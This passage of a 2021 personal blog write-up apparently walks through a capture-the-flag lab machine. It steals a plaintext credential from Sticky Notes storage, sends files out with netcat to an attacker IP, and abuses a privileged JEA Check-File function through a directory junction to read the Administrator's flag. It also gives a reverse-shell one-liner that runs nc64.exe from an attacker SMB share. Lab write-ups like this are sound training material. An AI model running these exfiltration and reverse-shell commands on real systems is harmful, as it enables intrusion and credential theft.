Users\k.svensson\AppData\Roaming\stickynotes\Local Storage\leveldb\000003.log</span></span></span></code></pre></li><li id="https://www.notion.so/272c6551e2c14ae4a16fe0326ffbb4be" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">We see a directory in </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">%appdata%\Roaming</code></span><span class="SemanticString"> called </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">stickynotes</code></span><span class="SemanticString">:</span></span><div id="https://www.notion.so/f3e7d295e0514fd49c148ba9b24fc977" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">&gt; ls &#x27;C:\Users\k.svensson\AppData\Roaming\stickynotes&#x27;</code></span></span></p></div><pre id="https://www.notion.so/b1f5d6b4fb394a8c84baa8ef062b30ff" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>Directory: C:\Users\k.svensson\AppData\Roaming\stickynotes

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        2/14/2021   7:36 AM                blob_storage
d-----        7/30/2020   1:19 PM                Cache
d-----        7/30/2020   1:19 PM                GPUCache
d-----        7/30/2020   1:19 PM                Local Storage
d-----        7/30/2020   1:19 PM                logs
-a----        7/30/2020   1:19 PM             36 .updaterId
-a----        7/30/2020   1:19 PM          20480 Cookies
-a----        7/30/2020   1:19 PM              0 Cookies-journal
-a----        7/30/2020   1:23 PM            159 Network Persistent State</span></span></span></code></pre></li><li id="https://www.notion.so/9b06a7add862457292c352d9b83397e2" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Zip up the directory:</span></span><div id="https://www.notion.so/816b45bd7061424ab5fc4630d05255ac" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">&gt; Compress-Archive -Path &#x27;C:\Users\k.svensson\AppData\Roaming\stickynotes\Local Storage\*&#x27; -DestinationPath &#x27;C:\Users\k.svensson\Videos\stickynotes.zip&#x27;</code></span></span></p></div></li><li id="https://www.notion.so/7e4b90d048524ef998bd434e7fe77f2f" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Getting error messages, we see that some cache files could not be accessed because the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">stickynotes</code></span><span class="SemanticString"> application is currently running:</span></span><pre id="https://www.notion.so/c4f5c40616d14095b533a202db349b1f" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>ZipArchiveHelper : The process cannot access the file &#x27;C:\Users\k.svensson\AppData\Roaming\stickynotes\Cache\index&#x27; because it is being used by another process.</span></span></span></code></pre></li><li id="https://www.notion.so/85e0bca509aa4e0ca2c506907193e948" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Checking currently running processes:</span></span><div id="https://www.notion.so/8846aaf8a90c49e7b9c2b57b64910071" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">&gt; ps</code></span></span></p></div><pre id="https://www.notion.so/2bd1748fb73a4b10bbfb641b146eb398" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
468      36        24872      50680      66.80   6284   1 stickynotes
340      29        21120      34200      77.36   6612   1 stickynotes
251      30        46512      67312     139.00   6708   1 stickynotes</span></span></span></code></pre></li><li id="https://www.notion.so/6acdcd321b2b4fa4942a7ecbd43c43d7" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Retry by first copying the files to a separate directory and then zipping:</span></span><div id="https://www.notion.so/761b23a9bf2d40fc8c5aed2aef03b1e3" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">&gt; Copy-Item -Path &quot;C:\Users\k.svensson\AppData\Roaming\stickynotes\*&quot; -Force</code></span></span></p></div><div id="https://www.notion.so/48f8ba044e6c44f4a90cef6a9de72ea5" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">&gt; Compress-Archive -Path &#x27;C:\Users\k.svensson\Videos\stickynotes\*&#x27; -DestinationPath &#x27;C:\Users\k.svensson\Videos\stickynotes.zip&#x27;</code></span></span></p></div></li><li id="https://www.notion.so/fa1f9a131d9b48f99637c4d6d537cfd6" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Send back the contents of this directory to investigate locally:</span></span><div id="https://www.notion.so/e3591195d638472fb948fd12b8e354f0" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">&gt; type &#x27;C:\Users\k.svensson\Videos\stickynotes.zip&#x27; | ./nc64.exe 10.10.14.103 1337</code></span></span></p></div></li><li id="https://www.notion.so/4bbc16490d494c32804ae56ee4a88f6b" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Turns out the zip file was corrupted in the transfer. Can&#x27;t be bothered to make this work now, so let&#x27;s just copy the logfile individually:</span></span><div id="https://www.notion.so/5465b71310184989b14e84b78d9324f7" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">&gt; type &#x27;C:\Users\k.svensson\AppData\Roaming\stickynotes\Local Storage\leveldb\000003.log&#x27; | ./nc64.exe 10.10.14.103 1337</code></span></span></p></div></li><li id="https://www.notion.so/bfcfe91574e3402f92f9f3b8a741474e" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Looking at the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">000003.log</code></span><span class="SemanticString"> file, we see that there are non-ASCII characters that can&#x27;t be displayed in our editor.</span></span></li><li id="https://www.notion.so/23ba7da6a83740cc80a93a1ca68a0c3f" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Running </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">strings</code></span><span class="SemanticString"> against the log file:</span></span><div id="https://www.notion.so/757be989c7af44f18d82862f0af9aa0f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ strings 000003.log</code></span></span></p></div><pre id="https://www.notion.so/afd16aefd86841c8acdebc3332be5e6d" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>...
{&quot;first&quot;:&quot;&lt;p&gt;Credentials for JEA&lt;/p&gt;&lt;p&gt;jea_test_account:Ab!Q@vcg^%@#1&lt;/p&gt;&quot;,&quot;back&quot;:&quot;rgb(255, 242, 171)&quot;,&quot;title&quot;:&quot;rgb(255, 235, 129)&quot;,&quot;wid&quot;:&quot;350&quot;,&quot;hei&quot;:&quot;375&quot;,&quot;deleted&quot;:&quot;no&quot;,&quot;closed&quot;:&quot;yes&quot;,&quot;locked&quot;:&quot;no&quot;}</span></span></span></code></pre></li><li id="https://www.notion.so/65d2f363cc33458dabb9b2dcdce6dc84" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Found credentials for JEA test account:</span></span><div id="https://www.notion.so/fca7dd45302a489aa367816703c8f7b4" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">jea_test_account:Ab!Q@vcg^%@#1</code></span></span></p></div></li><li id="https://www.notion.so/081e1cf563334420894800af6834900e" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Creating a new PowerShell session and remoting in as jea_test_account:</span></span><div id="https://www.notion.so/f8ea3722d73f4901b6ea4e4d6dbaafe1" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ pwsh</code></span></span></p></div></li><li id="https://www.notion.so/647e07a6e3514b23b8729c3410fb73cf" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Since the password contain special characters, let&#x27;s define some credential variables:</span></span><div id="https://www.notion.so/f6e82d5174f0400ea59cc86919f5b3e0" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">&gt; $username = &quot;jea_test_account&quot;</code></span></span></p></div><div id="https://www.notion.so/94a52c5968d04e5ebb474a987cc073ae" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">&gt; $password = ConvertTo-SecureString &quot;Ab!Q@vcg^%@#1&quot; -AsPlainText -Force</code></span></span></p></div></li><li id="https://www.notion.so/9cd2017ac55840148c98b8e2cda14be8" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Define a credential object:</span></span><div id="https://www.notion.so/1037a4d1e03b40569104729c642690c0" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">&gt; $cred = New-Object System.Management.Automation.PSCredential -ArgumentList ($username, $password)</code></span></span></p></div></li><li id="https://www.notion.so/26c67f2de68b459fb576678c127c870d" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Initiate the session and enter it:</span></span><div id="https://www.notion.so/29361bf033d04a9596ef7effeeba46a9" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">&gt; $session = New-PSSession -Computer 10.10.10.210 -credential $cred -Authentication Negotiate -ConfigurationName jea_test_account</code></span></span></p></div><div id="https://www.notion.so/bfdcb85bb71e497ea72b116f7fa29234" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">&gt; Enter-PSSession $session</code></span></span></p></div></li><li id="https://www.notion.so/ce221140a43c49df9827d03c397872c4" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Checking available commands on jea_test_account:</span></span><div id="https://www.notion.so/f5123555a1114a1a8264413089a4c6cb" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">&gt; Get-Command</code></span></span></p></div><pre id="https://www.notion.so/e2b31f8c1c074d26868e19a22393a1da" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Function        Check-File
Function        Clear-Host
Function        Exit-PSSession
Function        Get-Command
Function        Get-FormatData
Function        Get-Help
Function        Measure-Object
Function        Out-Default
Function        Select-Object</span></span></span></code></pre></li><li id="https://www.notion.so/f029605e695540e7b32471f3037c0e04" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">We can see the custom defined </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">Check-File</code></span><span class="SemanticString"> function we found earlier in the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">.psrc</code></span><span class="SemanticString"> file.</span></span></li><li id="https://www.notion.so/56aed35ed7834428b0ad36fbb13585be" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">On k.svensson&#x27;s session, let&#x27;s now create a symbolic link between an arbitrary folder in </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">C:\ProgramData</code></span><span class="SemanticString"> and </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">C:\Users\Administrator</code></span><span class="SemanticString"> to abuse the privileged file read in </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">Check-File</code></span><span class="SemanticString">:</span></span><div id="https://www.notion.so/705fa4fae551421db8fd5a790ef097cb" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">&gt; New-Item -ItemType Junction -Path &#x27;C:\ProgramData\pwn&#x27; -Target &#x27;C:\Users\Administrator&#x27;</code></span></span></p></div></li><li id="https://www.notion.so/8414a51a58154a1e8f7a3d8b86513a87" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Execute the read payload on jea_test_account:</span></span><div id="https://www.notion.so/828337ba63f04cee99da63cf7e2827b2" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">&gt; Check-File C:\ProgramData\pwn\Desktop\root.txt</code></span></span></p></div></li><li id="https://www.notion.so/61d1d25813534810b6b4cefb40f76bfb" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Get root flag!</span></span></li></ul><h2 id="https://www.notion.so/36062e009fa04e23b2f76f7b4a450b99" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/36062e009fa04e23b2f76f7b4a450b99"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Persistence</span></span></h2><ul class="BulletedListWrapper"><li id="https://www.notion.so/50db8be7c4504c799f1baee6eeb65d7f" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">It wasn&#x27;t possible to get an administrator shell on this machine (as far as I was aware).</span></span></li><li id="https://www.notion.so/65d78a2a576a402f9cbed32b8a273b2d" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">There is an easier and quieter way to get a </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">nc</code></span><span class="SemanticString"> reverse shell from k.svensson, without needing to download the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">nc64.exe</code></span><span class="SemanticString"> binary onto the victim&#x27;s computer manually.</span></span></li><li id="https://www.notion.so/73450056bbbb4abea5c2719d9405246e" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Host an SMB share containing the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">nc64.exe</code></span><span class="SemanticString"> binary and listen for a reverse connection:</span></span><div id="https://www.notion.so/2619fc87f8c54868973ccb5a35f54419" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ sudo smbserver.py samiko ./ -smb2support</code></span></span></p></div><div id="https://www.notion.so/325716debe494cb4a85f3d2de619799e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ nc -lvnp 1337</code></span></span></p></div></li><li id="https://www.notion.so/01ed25fdb474435a9b7ebcc8e536ea5d" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">On the restricted PowerShell session, simply execute:</span></span><div id="https://www.notion.so/1cbd30a912014b9abef5b54d73dd43b7" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">&gt; &amp;{\\10.10.14.103\\samiko\\nc64.exe 10.10.14.103 1337 -e powershell.exe}</code></span></span></p></div></li></ul><h2 id="https://www.notion.so/7726482458164c379009b159bbc9e2d9" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/7726482458164c379009b159bbc9e2d9"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Resources</span></span></h2><ol class="NumberedListWrapper"><li id="https://www.notion.so/22d1e1b5b5374ca3b5a62849525ed855" class="NumberedList" value="1"><span class="SemanticStringArray"><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://github.com/munafio/wallstant">https://github.com/munafio/wallstant</a></span></span></li><li id="https://www.notion.so/eb12e321ee8d4de5b1cec6287405625a" class="NumberedList" value="2"><span class="SemanticStringArray"><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://book.hacktricks.xyz/windows/active-directory-methodology/password-spraying#outlook-web-access">https://book.hacktricks.xyz/windows/active-directory-methodology/password-spraying#outlook-web-access</a></span></span></li><li id="https://www.notion.so/0b5c9a7efc28488f9e0fd10e5732418b" class="NumberedList" value="3"><span class="SemanticStringArray"><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://www.ired.team/offensive-security/initial-access/netntlmv2-hash-stealing-using-outlook">https://www.ired.team/offensive-security/initial-access/netntlmv2-hash-stealing-using-outlook</a></span></span></li><li id="https://www.notion.so/43d9b745fb0745a8abb7aa0ba6f08eff" class="NumberedList" value="4"><span class="SemanticStringArray"><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://blog.rapid7.com/2020/04/06/phishing-for-system-on-microsoft-exchange-cve-2020-0688/">https://blog.rapid7.com/2020/04/06/phishing-for-system-on-microsoft-exchange-cve-2020-0688/</a></span></span></li><li id="https://www.notion.so/a7679c9308514c06a6a0dfaeaca8b4d8" class="NumberedList" value="5"><span class="SemanticStringArray"><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enter-pssession?view=powershell-7.1">https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enter-pssession?view=powershell-7.1</a></span></span></li><li id="https://www.notion.so/c101bb3fdba44d1394647e5a4aedb9cd" class="NumberedList" value="6"><span class="SemanticStringArray"><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/">https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/</a></span></span></li><li id="https://www.notion.so/8c388c030fcc4184b020424a1ad59700" class="NumberedList" value="7"><span class="SemanticStringArray"><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://www.ired.team/offensive-security/code-execution/powershell-constrained-language-mode-bypass">https://www.ired.team/offensive-security/code-execution/powershell-constrained-language-mode-bypass</a></span></span></li><li id="https://www.notion.so/5a9371420b974ec7ba9c8b46282c7ba8" class="NumberedList" value="8"><span class="SemanticStringArray"><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://winaero.com/create-symbolic-link-windows-10-powershell/">https://winaero.com/create-symbolic-link-windows-10-powershell/</a></span></span></li></ol></article>
  <footer class="Footer">
        <div>&copy; samiko@127.0.0.1~$ &centerdot; 2021</div>
        <div>&centerdot;</div>
        <div>Powered by <a href="https://github.com/dragonman225/notablog" target="_blank"
            rel="noopener noreferrer">Notablog</a>.
        </div>
    </footer>
</body>

</html>
